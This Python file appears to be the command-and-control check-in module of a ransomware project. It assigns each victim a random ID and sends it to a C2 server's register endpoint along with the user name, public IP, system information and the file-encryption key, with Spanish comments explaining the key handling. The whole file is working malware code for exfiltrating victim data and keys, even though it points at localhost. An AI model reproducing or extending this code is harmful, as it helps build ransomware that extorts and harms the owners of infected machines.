import random
import string
import requests
from encrypt import current_user,public_ip,system_info
from main import key

def generate_victimID():
 result = []
 for x in range(20):
  result.append((random.choice(string.ascii_letters + string.digits)))
 return "".join(result)
VICTIM_ID = generate_victimID()

#send victim id to c2 server (c2.py)

def send_to_c2():
 url = "http://127.0.0.1:5000/register"
 data = {"victim_ID" : VICTIM_ID,
         "current_user" : str(current_user),
         "public_ip" : str(public_ip),
         "system_info": str(system_info),

         #Intenta decodificar la llave, pero hazlo SOLO SI la variable key es de tipo bytes,
         #De lo contrario (si ya es texto), déjala como está
         "key" :  key.decode() if isinstance(key, bytes) else key} #decode key for the JSON
 try:
   response = requests.post(url, json=data)
   print(f"Status : {response.status_code}")
   print("Datos enviados con éxito al C2")
 except Exception as e:
        print(f"ERROR: {e}")
send_to_c2()

